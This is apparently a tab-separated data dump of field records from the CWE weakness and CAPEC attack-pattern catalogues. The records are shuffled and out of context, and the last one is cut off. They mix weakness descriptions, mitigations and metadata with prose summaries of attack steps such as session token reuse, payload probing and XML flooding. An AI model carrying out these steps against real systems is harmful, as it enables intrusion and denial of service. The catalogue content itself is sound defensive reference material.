12920	46	When the program accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access.             While this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways.             This weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.
21369	62	updated Time_of_Introduction
25336	95	[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.
8843	28	CWE Content Team
11192	62	updated References
8477	39	2008-09-08
10924	62	updated Relationships, Taxonomy_Mappings
7661	62	updated References, Relationships, Taxonomy_Mappings
18734	39	2018-03-27
12677	26	Architecture and Design
6943	90	Language-Independent
23982	26	Architecture and Design
8774	49	2005
25166	100	The MITRE Corporation
24256	54	High
18357	47	Modify Data
11591	24	MITRE
23970	46	Incomplete filtering of this nature involves either:                                                only filtering a single instance of a special element when more exist, or                   not filtering all instances or all elements where multiple special elements exist.
9081	103	Primary
13106	28	CWE Content Team
22493	39	2014-07-30
25266	35	MITRE
20500	79	Confidentiality
23515	79	Confidentiality
13364	35	MITRE
6696	91	Build and Compilation
22104	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
16406	28	CWE Content Team
11988	81	Availability
5851	92	Exploit
18949	23	An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.
22075	56	ChildOf
13327	35	MITRE
20546	39	2008-07-01
14290	62	updated Relationships
13351	91	Implementation
20930	102	ChildOf
21110	39	2012-05-11
7376	100	The MITRE Corporation
13391	62	updated References, Relationships
20312	35	MITRE
11253	91	Architecture and Design
8058	33	Hal Burch
9349	61	Draft
24413	51	2015-11-09
18653	56	Requires
10090	31	1000
6049	92	Exploit
19788	35	MITRE
9425	39	2011-06-27
25424	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
8085	39	2010-04-05
6474	59	Updated Related_Attack_Patterns
21012	57	Indirect
22406	35	MITRE
8617	66	The importance of input validation
17051	31	1000
16426	62	updated Common_Consequences
24897	28	CWE Content Team
20914	62	updated Description, Relationships
13240	97	Infected Memory
7344	35	Cigital
14491	62	updated Potential_Mitigations, Time_of_Introduction
21748	79	Confidentiality
13885	59	Updated Description Summary, Resources_Required
19246	59	Updated Related_Weaknesses
16832	62	updated Demonstrative_Examples, Description, Name
8493	85	529
22291	35	MITRE
17723	50	Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.
19850	62	updated Relationships
9363	28	CWE Content Team
20150	39	2012-10-30
20618	78	Very High
8920	66	GNU GCC: Optimizer Removes Code Necessary for Security
14702	26	Implementation
14268	74	1
10099	62	updated Taxonomy_Mappings
8587	62	updated Relationships, Other_Notes, Taxonomy_Mappings
23859	28	CWE Content Team
11682	39	2009-07-27
8458	23	A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.
17506	96	2008-09-09
22438	62	updated Relationships, Taxonomy_Mappings
21085	35	MITRE
7772	81	Other
23545	28	CWE Content Team
22255	28	CWE Content Team
9316	69	Draft
10333	47	Modify Data
14280	39	2010-04-05
14168	51	2014-06-23
23032	81	Integrity
5885	48	03
22676	26	Operation
18130	28	CWE Content Team
5811	39	2009-10-29
23003	63	Hide Activities
16899	39	2011-06-01
20962	62	updated Demonstrative_Examples
8611	35	MITRE
14386	62	updated Relationships
21930	35	MITRE
15477	39	2012-05-11
9405	28	CWE Content Team
6290	23	An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.
12671	56	ChildOf
19177	45	Variant
11130	62	updated Related_Attack_Patterns
23551	35	MITRE
7712	39	2017-11-08
6134	79	Authorization
13663	35	MITRE
15679	56	ChildOf
16671	81	Integrity
22512	76	2017-08-04
18979	51	2014-06-23
21452	28	CWE Content Team
16198	28	CWE Content Team
25105	28	CWE Content Team
21189	45	Variant
19327	28	CWE Content Team
6810	35	MITRE
13061	39	2014-06-23
19794	63	Execute Unauthorized Code or Commands
14719	62	updated Relationships
18576	28	CWE Content Team
12055	63	Read Application Data
22859	30	George Kurtz
17288	56	ChildOf
7364	21	CWE Content Team
5878	62	updated Relationships
16359	73	If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.
17663	62	updated Taxonomy_Mappings
24595	35	MITRE
17954	81	Integrity
23298	35	MITRE
8687	62	updated Time_of_Introduction
19584	101	CAPEC Content Team
25108	23	The program violates the Enterprise JavaBeans (EJB) specification by using sockets.
18369	52	Since format strings often occur in rarely-occurring erroneous conditions (e.g. for error message logging), they can be difficult to detect using black box methods. It is highly likely that many latent issues exist in executables that do not have associated source code (or equivalent source.
22214	21	PLOVER
15476	31	699
14817	62	updated Relationships
7408	35	MITRE
25194	81	Integrity
23687	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
20818	35	Cigital
6011	88	Exposure of Backup File to an Unauthorized Control Sphere
24027	31	1000
17477	59	Updated Description, Description Summary, Related_Attack_Patterns
17511	35	MITRE
17135	62	updated Demonstrative_Examples, Relationships
8538	28	CWE Content Team
17674	35	MITRE
15562	61	Draft
21262	72	If the CBC is not properly initialized, data that is encrypted can be compromised and therefore be read.
19793	39	2008-09-08
12847	62	updated Potential_Mitigations
22928	26	Architecture and Design
23668	26	Implementation
23593	39	2010-06-21
8460	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
24426	62	updated Relationships
8825	56	CanPrecede
13662	62	updated Common_Consequences
23005	101	CAPEC Content Team
18177	28	CWE Content Team
20227	28	CWE Content Team
23419	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
18376	79	Confidentiality
18788	61	Draft
19197	81	Integrity
16377	23	A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.
22658	35	MITRE
17449	39	2019-09-19
15542	56	ChildOf
20821	79	Integrity
21144	59	Updated Related_Attack_Patterns
22343	47	Execute Unauthorized Commands
21764	39	2012-05-11
10923	35	MITRE
19296	35	MITRE
20450	95	The attacker accesses the server using a specific URL.
20712	28	CWE Content Team
14543	39	2011-06-01
6148	69	Stable
6077	35	MITRE
22459	31	1000
20861	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
13678	39	2009-05-27
10318	72	Can result in unintended modifications or exposure of sensitive memory.
9433	62	updated Relationships, Taxonomy_Mappings
19577	35	MITRE
8307	85	2
7661	39	2010-02-16
15952	76	2018-07-31
22386	28	Eric Dalci
17536	28	CWE Content Team
17690	100	The MITRE Corporation
13169	88	Acceptance of Extraneous Untrusted Data With Trusted Data
25032	62	updated References, Relationships, Taxonomy_Mappings
5684	31	1003
7407	51	2014-06-23
6349	88	Path Traversal: '\dir\..\filename'
10440	104	450
22529	69	Draft
7787	39	2013-02-21
17894	35	MITRE
19350	35	MITRE
11700	28	CWE Content Team
18569	35	MITRE
14359	62	updated Description, Relationships
10933	76	2017-08-04
5865	23	An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.
14411	78	High
7889	35	MITRE
14122	79	Authorization
17107	97	DNS Zone Transfers
17568	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Context-configured Source Code Weakness Analyzer                                                                     Cost effective for partial coverage:                                                                           Source code Weakness Analyzer
15119	91	Architecture and Design
21011	80	Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in system design.
14740	62	updated Applicable_Platforms, References, Relevant_Properties
23392	28	CWE Content Team
18466	42	In order to protect password systems from compromise, the following should be noted:                                                                  Passwords should be stored safely to prevent insider attack and to ensure that -- if a system is compromised -- the passwords are not retrievable. Due to password reuse, this information may be useful in the compromise of other systems these users work with. In order to protect these passwords, they should be stored encrypted, in a non-reversible state, such that the original text password cannot be extracted from the stored value.                         Password aging should be strictly enforced to ensure that passwords do not remain unchanged for long periods of time. The longer a password remains in use, the higher the probability that it has been compromised. For this reason, passwords should require refreshing periodically, and users should be informed of the risk of passwords which remain in use for too long.                         Password strength should be enforced intelligently. Rather than restrict passwords to specific content, or specific length, users should be encouraged to use upper and lower case letters, numbers, and symbols in their passwords. The system should also ensure that no passwords are derived from dictionary words.
10296	62	updated Potential_Mitigations, Time_of_Introduction
19982	27	The attacker must be able to manipulate the communications to the targeted application or service.
13295	94	Denial of Service
18356	85	139
13637	51	2014-06-23
12197	62	updated Common_Consequences, Description, Other_Notes, Relationships
8702	28	CWE Content Team
6300	35	MITRE
5966	63	DoS: Resource Consumption (CPU)
14442	56	ChildOf
17502	42	Protect mutable objects by making them private. Restrict access to the getter and setter as well.
18066	45	Class
16893	101	CAPEC Content Team
14051	62	updated Modes_of_Introduction, Other_Notes
20193	40	The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.
22903	39	2008-09-08
20885	62	updated Potential_Mitigations, Time_of_Introduction
14924	31	1000
23207	35	MITRE
18859	43	Simple
8575	23	An adversary registers a domain name containing a homoglyph, leading the registered domain to appear the same as a trusted domain. A homograph attack leverages the fact that different characters among various character sets look the same to the user. Homograph attacks must generally be combined with other attacks, such as phishing attacks, in order to direct Internet traffic to the adversary-controlled destinations.
16312	55	CAPEC Content Team
21869	39	2014-07-30
7614	27	None: No specialized resources are required to execute this type of attack.
22541	43	Simple
10145	26	Implementation
16392	56	ChildOf
20859	28	CWE Content Team
11056	28	Sean Eidemiller
10222	35	MITRE
16600	51	2014-06-23
21652	28	CWE Content Team
14509	62	updated Potential_Mitigations, Time_of_Introduction
9538	39	2012-10-30
16672	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
15562	50	Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)
15668	28	CWE Content Team
16527	30	Fortify Software
21340	62	updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, Relationship_Notes, Relationships, Terminology_Notes
17833	62	updated Name, Relationships
9015	39	2008-10-14
15709	28	CWE Content Team
20897	67	High
17814	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References
16354	35	MITRE
14490	39	2010-06-21
22780	72	Trust afforded to the system in question - based on the expired certificate - may allow for spoofing attacks.
25268	35	MITRE
7346	62	updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships
9093	103	Primary
23420	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
24570	28	CWE Content Team
10728	28	CWE Content Team
11431	62	updated Demonstrative_Examples
16636	103	Primary
21550	28	CWE Content Team
16393	21	CWE Content Team
12474	62	updated Relationships, Taxonomy_Mappings
19150	50	Implementation: Validate object before deserialization process                Design: Limit which types can be deserialized.                Implementation: Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. Whitelist acceptable classes.                Implementation: Keep session state on the server, when possible.
17234	39	2010-06-21
22781	28	CWE Content Team
20209	35	MITRE
21755	103	Primary
23957	45	Base
24671	62	updated References, Relationships
23063	39	2012-05-11
12192	86	http://www.owasp.org/index.php/ASP.NET_Misconfiguration:_Missing_Custom_Error_Handling
8406	97	Reusing Session IDs (aka Session Replay)
17952	26	Operation
20254	83	v4 [DRAFT]
16790	28	CWE Content Team
8886	102	ChildOf
14587	39	2009-10-29
12758	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as whitespace when they are sent to a downstream component.
11725	86	http://www.securereality.com.au/studyinscarlet.txt
8736	62	updated Relationships
7672	102	ChildOf
17784	28	CWE Content Team
6487	66	HttpOnly
7758	62	Suggested OWASP Top Ten 2004 mapping
23116	39	2014-07-30
24450	97	Flooding
22777	62	updated Other_Notes
20241	39	2008-09-08
18991	35	MITRE
24092	56	ChildOf
5662	25	Low
20490	35	MITRE
18368	92	Exploit
15394	103	Primary
21676	39	2018-03-27
23624	62	updated Relationships
13635	22	02
9063	28	CWE Content Team
7770	97	ICMP Fragmentation
8087	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
16412	91	Implementation
24270	103	Primary
14545	39	2012-05-11
19201	91	Implementation
14587	28	CWE Content Team
21617	62	updated Relationships
13225	39	2012-05-11
20348	28	CWE Content Team
18688	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
8838	76	2018-07-31
15009	62	updated Background_Details, Demonstrative_Examples, Description, Other_Notes
7425	28	CWE Content Team
13750	95	[Identify URL inputs allowing local access.] Execute test local commands via each URL input to determine which are successful.
18214	35	MITRE
19031	56	ChildOf
6291	102	ChildOf
20813	48	03
11761	28	CWE Content Team
16112	104	597
8004	45	Variant
13053	76	2019-04-04
9349	40	The target application must fail to sanitize incoming messages adequately before processing and must generate a stack trace in at least some error situations.
17049	104	662
22725	39	2008-09-08
23025	63	Modify Memory
10740	35	MITRE
18296	28	CWE Content Team
12311	23	The software supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.
10398	62	updated Description, Other_Notes, References
11942	23	The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.
16414	101	CAPEC Content Team
15104	23	The software does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.
15481	45	Variant
18722	69	Draft
14679	94	Run Arbitrary Code
25301	28	Eric Dalci
13133	85	272
21220	39	2008-09-08
18172	81	Integrity
8701	35	MITRE
24366	97	Pretexting via Customer Service
13323	40	The application accepts and decodes URL string request.
15636	44	SOAR Partial
24935	23	The source code contains elements such as source files       that do not consistently provide a prologue or header that has been      standardized for the project.
5966	63	DoS: Crash, Exit, or Restart
20933	28	CWE Content Team
6790	63	Read Application Data
13142	39	2008-09-08
15651	103	Primary
20644	28	CWE Content Team
9580	72	A single fault could allow either an overflow (CWE-788) or underflow (CWE-786) of the array index. What happens next will depend on the type of operation being performed out of bounds, but can expose sensitive information, cause a system crash, or possibly lead to arbitrary code execution.
20373	28	CWE Content Team
12366	95	[Attempt injection payload variations on input parameters] Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.
18052	28	CWE Content Team
14906	39	2017-01-19
7855	100	The MITRE Corporation
9282	36	http://www.securityfocus.com/infocus/1706
23989	73	Brute force guessing of resource names
19445	39	2019-06-20
6916	85	202
12258	35	MITRE
12484	56	ChildOf
13129	72	Many memory accesses can lead to program termination, such as when writing to addresses that are invalid for the current process.
7700	28	CWE Content Team
11145	45	Base
17431	31	699
16111	102	ChildOf
7953	91	Implementation
12537	39	2012-10-30
10896	35	MITRE
12570	28	CWE Content Team
13725	61	Draft
5979	21	Pascal Meunier
10079	31	699
15231	60	05
18987	67	Medium
23391	39	2014-07-30
15775	88	Creation of chroot Jail Without Changing Working Directory
20353	39	2014-07-30
9932	28	CWE Content Team
23727	43	Simple
7008	102	ChildOf
13771	77	Architecture or Design Review
9263	53	The MITRE Corporation
24503	103	Primary
18703	62	updated Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings, Terminology_Notes
18624	35	MITRE
7584	62	updated Potential_Mitigations, Time_of_Introduction
19927	104	636
11570	28	Eric Dalci
10126	28	CWE Content Team
14657	28	CWE Content Team
8250	89	Standard
7272	72	Adjacent variables in memory may be corrupted by assignments performed on fields after the cast.
21423	62	updated Observed_Examples, Relationships
13188	35	MITRE
6542	39	2014-07-30
11750	97	Modification During Manufacture
9476	45	Variant
18178	39	2010-06-21
16836	56	ChildOf
23414	56	ChildOf
12512	91	Architecture and Design
15468	63	Read Files or Directories
18943	62	updated Related_Attack_Patterns, Relationships
23574	39	2012-05-11
14502	79	Confidentiality
10338	39	2014-07-30
23746	69	Draft
21263	35	MITRE
25342	28	CWE Content Team
18507	89	Detailed
11071	35	MITRE
15060	39	2014-07-30
18537	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes
20651	35	MITRE
7617	35	MITRE
14019	62	Suggested OWASP Top Ten 2004 mapping
18966	62	updated Time_of_Introduction
13972	39	2008-07-01
20801	100	The MITRE Corporation
11174	35	MITRE
20493	56	ChildOf
23141	72	Injected code can access resources that the attacker is directly prevented from accessing.
8750	39	2017-01-19
13131	39	2012-05-11
16512	35	MITRE
12336	91	Architecture and Design
8759	91	Implementation
10068	62	updated References, Potential_Mitigations, Time_of_Introduction
19269	40	The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.
5693	39	2011-09-13
9124	86	https://www.owasp.org/index.php/PHP_Object_Injection
24218	70	SAMATE - Software Assurance Metrics And Tool Evaluation
17863	39	2012-05-11
19253	74	1
24647	62	updated Potential_Mitigations
14336	42	Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.
18684	21	Pascal Meunier
16375	62	updated Description, Name
9027	50	Ensure proper permissions are set for Registry hives to prevent users from modifying keys.
6984	85	153
17936	39	2009-10-29
13283	33	Brian Krebs
21025	35	MITRE
20488	76	2017-01-09
21474	31	1000
17335	100	The MITRE Corporation
16379	50	Ensure the WSDL does not expose functions and APIs that were not intended to be exposed.
10313	35	MITRE
9903	26	Implementation
9162	33	Web Application Security Consortium
13877	35	MITRE
20085	26	Operation
6980	35	MITRE
20457	53	The MITRE Corporation
24841	23	The application does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.
23010	39	2009-10-29
13038	91	System Configuration
9918	39	2011-03-29
24726	43	Simple
7020	63	Quality Degradation
16924	62	updated Related_Attack_Patterns
24498	28	CWE Content Team
13649	39	2009-12-28
10671	95	[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.
21325	51	2014-06-23
13523	91	Architecture and Design
7464	39	2019-06-20
23829	56	ChildOf
20573	96	2013-01-28
8684	89	Detailed
25092	28	CWE Content Team
20960	39	2017-05-03
16406	39	2012-05-11
24210	35	MITRE
24056	62	updated Description, Name
7097	47	Gain Privileges
20203	28	CWE Content Team
11959	28	CWE Content Team
9415	35	MITRE
22387	35	MITRE
10956	39	2008-09-08
14771	62	updated Common_Consequences
24784	101	CAPEC Content Team
11153	45	Base
10903	28	CWE Content Team
12335	35	MITRE
17588	94	Run Arbitrary Code
12267	28	Eric Dalci
9793	56	ChildOf
7055	81	Availability
14564	35	MITRE
24135	102	ChildOf
8184	31	699
24208	101	CAPEC Content Team
7478	21	CWE Content Team
21727	103	Primary
20838	39	2010-04-05
21620	39	2017-11-08
23996	31	1000
18949	78	Medium
11468	39	2011-06-01
21050	39	2014-07-30
13349	90	Language-Independent
15260	39	2017-11-08
7958	100	The MITRE Corporation
20695	76	2017-05-01
18783	62	updated Time_of_Introduction
12175	78	Very High
22213	62	updated Relationships
8769	28	CWE Content Team
24561	56	ChildOf
19991	76	2017-05-01
14105	56	ChildOf
21583	28	CWE Content Team
21709	103	Primary
8406	54	High
7073	35	MITRE
6027	28	CWE Content Team
7384	26	Architecture and Design
6310	39	2010-12-13
18951	40	The attacker must be able to control the options or switches sent to the target.
11019	39	2018-03-27
11231	28	CWE Content Team
6670	28	CWE Content Team
11176	39	2008-07-01
13116	55	CAPEC Content Team
6420	35	MITRE
9448	81	Integrity
21811	77	Automated Static Analysis
17220	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7687	28	CWE Content Team
12164	47	Unreliable Execution
16493	62	updated Related_Attack_Patterns, Relationships
21584	35	MITRE
8852	39	2013-02-21
10897	39	2008-09-08
10322	81	Confidentiality
24938	85	504
15876	62	updated Relationships, Taxonomy_Mappings
19711	59	Updated Description Summary, Related_Weaknesses
23889	35	MITRE
17851	43	Simple
13162	35	MITRE
12865	62	updated Time_of_Introduction
18334	35	MITRE
16175	56	ChildOf
15108	44	SOAR Partial
24891	31	699
22599	77	Automated Dynamic Analysis
12551	67	Medium
21508	35	MITRE
12054	32	The Open Web Application Security Project (OWASP)
11666	69	Draft
25031	56	ChildOf
19977	45	Variant
13347	62	updated Related_Attack_Patterns, Relationships
22002	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
10434	91	Architecture and Design
7686	62	updated Common_Consequences
14452	25	High
8965	35	MITRE
13724	63	DoS: Crash, Exit, or Restart
10515	28	CWE Content Team
5772	62	updated Name
15941	81	Availability
24329	28	CWE Content Team
15462	56	ChildOf
12760	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13164	50	Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes.
10908	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
10463	40	Proximal access to the device.
20141	35	MITRE
16334	39	2011-09-13
17387	79	Authorization
23550	95	[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions
12615	79	Authorization
15490	97	Web Application Fingerprinting
7288	28	CWE Content Team
10508	23	The web application uses the GET method to process requests that contain sensitive information, which can expose that information through the browser's history, Referers, web logs, and other sources.
12928	23	A regular expression is overly restrictive, which prevents dangerous values from being detected.
19847	35	MITRE
7313	28	CWE Content Team
12486	103	Primary
24877	70	DLL SIDE-LOADING: A Thorn in the Side of the Anti-Virus Industry
22212	47	Read Data
18860	103	Primary
23501	72	If the incorrect calculation is used in the context of memory allocation, then the software may create a buffer that is smaller or larger than expected. If the allocated buffer is smaller than expected, this could lead to an out-of-bounds read or write (CWE-119), possibly causing a crash, allowing arbitrary code execution, or exposing sensitive data.
19144	35	MITRE
23769	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19336	28	CWE Content Team
5997	62	updated Potential_Mitigations
10402	28	CWE Content Team
18211	103	Primary
19927	69	Draft
14005	25	Medium
20435	28	CWE Content Team
25018	39	2010-06-21
24106	95	An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.
10039	81	Access Control
19282	56	ChildOf
11842	59	Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
15882	77	Architecture or Design Review
12571	90	Language-Independent
17221	95	The attacker tries to find an environment variable which can be overwritten for instance by gathering information about the target host (error pages, software's version number, etc.).
16289	77	Automated Static Analysis - Binary or Bytecode
5954	56	CanPrecede
24824	100	The MITRE Corporation
13787	62	updated Demonstrative_Examples
16620	28	CWE Content Team
10324	39	2014-07-30
17880	42	Do not let the user control the size of the buffer.
10790	35	MITRE
23400	39	2010-02-16
22783	35	MITRE
13215	35	MITRE
9149	28	CWE Content Team
22503	31	699
13330	28	CWE Content Team
21878	45	Variant
13456	95	[Post a malicious HTTP Request] Post a malicious HTTP request that will be interpreted as multiple HTTP requests when parsed on the server
17086	35	MITRE
10899	31	1003
11842	76	2018-07-31
9267	31	1000
10041	59	Updated Attack_Phases, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required
13658	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Origin Analysis
24982	56	ChildOf
14793	28	CWE Content Team
5703	85	643
17378	54	Low
9600	31	1000
21447	35	MITRE
23333	59	Updated Activation_Zone, Attack_Motivation-Consequences, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Solutions_and_Mitigations
22809	39	2015-12-07
9623	88	NULL Pointer Dereference
9881	39	2012-05-11
17464	92	Explore
24547	39	2011-03-29
19599	103	Primary
13642	96	2018-07-02
16529	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
18428	26	Implementation
7513	104	685
11991	104	195
20614	39	2008-09-08
18427	79	Authorization
11501	24	Cigital
14591	88	Numeric Range Comparison Without Minimum Check
20793	39	2019-06-20
18779	104	235
8070	85	595
24798	90	XML
23474	56	ChildOf
21166	28	Eric Dalci
10601	103	Primary
6516	91	Architecture and Design
14865	24	MITRE
9142	81	Availability
22125	31	699
20820	89	Detailed
14871	88	Information Exposure Through Test Code
12221	23	An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.
14204	31	1000
16174	103	Primary
15836	49	2013
8559	35	MITRE
25243	35	MITRE
8156	35	MITRE
6377	28	CWE Content Team
6277	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
13327	28	CWE Content Team
21881	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
14481	28	CWE Content Team
17806	31	699
20989	79	Access Control
20693	43	Simple
13484	58	In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.
17724	28	CWE Content Team
20602	56	ChildOf
11429	28	CWE Content Team
15455	39	2019-01-03
9749	76	2017-08-04
23090	55	Seamus Tuohy
17732	88	Exposure of File Descriptor to Unintended Control Sphere ('File Descriptor Leak')
23345	76	2015-11-09
22290	39	2008-09-08
22092	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.   While the interpetation of "large data table" and "excessive index range" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.
15105	51	2014-06-23
9623	57	Resultant
13424	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
8636	50	Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.
18258	62	updated Applicable_Platforms, Description, Name, Observed_Examples, Potential_Mitigations, Terminology_Notes
10814	90	Language-Independent
16950	103	Primary
23419	44	High
8108	91	Implementation
13426	69	Draft
10121	50	Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.
8698	62	updated References, Relationships
21989	28	CWE Content Team
12370	63	Read Application Data
20195	28	CWE Content Team
6005	28	CWE Content Team
10132	101	CAPEC Content Team
15504	62	updated Relationships
21269	35	MITRE
19826	39	2017-05-03
22778	81	Access Control
7250	63	Hide Activities
19438	28	CWE Content Team
21527	35	MITRE
11119	35	MITRE
13107	89	Detailed
9574	45	Variant
13599	28	CWE Content Team
15043	39	2014-07-30
17054	35	MITRE
24944	63	Read Application Data
18581	53	The MITRE Corporation
21146	62	updated Relationships
17659	35	MITRE
24152	28	CWE Content Team
24016	79	Confidentiality
9346	50	Protect your log file from unauthorized modification and log forging.
13247	45	Variant
13420	39	2011-06-27
18804	77	Manual Static Analysis - Source Code
21527	62	updated Other_Notes
21033	60	28
20809	47	Modify Data
21020	39	2011-06-01
25045	59	Updated Related_Weaknesses
22892	51	2014-06-23
19735	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When 